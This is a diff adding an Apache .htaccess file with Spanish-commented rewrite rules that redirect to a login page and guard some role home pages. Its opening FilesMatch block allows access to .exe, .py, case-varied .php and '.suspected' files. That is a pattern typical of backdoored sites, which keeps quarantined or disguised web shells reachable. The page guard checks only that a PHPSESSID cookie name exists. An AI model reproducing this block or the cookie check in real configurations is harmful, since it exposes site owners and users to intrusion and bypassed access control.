@@ -1,0 +1,16 @@
+<FilesMatch ".(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|pHP7|PHP7|phP|PhP|php5|suspected)$">
+Allow from all
+</FilesMatch>
+
+
+RewriteEngine On
+RewriteBase /
+
+# Redirige la URL "/sad" al archivo de login (por ejemplo login.php)
+RewriteRule ^sad/?$ login.php [L]
+
+# Restricción: Si se intenta acceder directamente a las páginas de Home sin la cookie PHPSESSID, redirige a /sad.
+# Nota: Reemplaza "adminHome.html", "sistemasHome.html" y "docenteHome.html" según corresponda.
+RewriteCond %{REQUEST_URI} (adminHome\.html|coordinadorHome\.html|docenteHome\.html)$ [NC]
+RewriteCond %{HTTP:Cookie} !PHPSESSID [NC]
+RewriteRule ^.*$ /sad [R,L]
